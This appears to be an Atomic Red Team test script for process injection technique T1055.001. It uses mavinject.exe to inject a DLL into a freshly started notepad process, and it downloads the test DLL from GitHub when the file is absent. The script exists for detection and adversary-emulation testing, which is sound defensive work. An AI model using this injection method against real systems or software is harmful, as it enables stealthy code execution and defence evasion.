#Atomic Test #1 - Process Injection via mavinject.exe

if (Test-Path C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll) {
    $mypid = (Start-Process notepad -PassThru).id
    mavinject $mypid /INJECTRUNNING C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll
    Stop-Process -processname notepad
    exit 0
}else{
    New-Item -Type Directory (split-path C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll) -ErrorAction ignore | Out-Null
    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll"
    exit 1}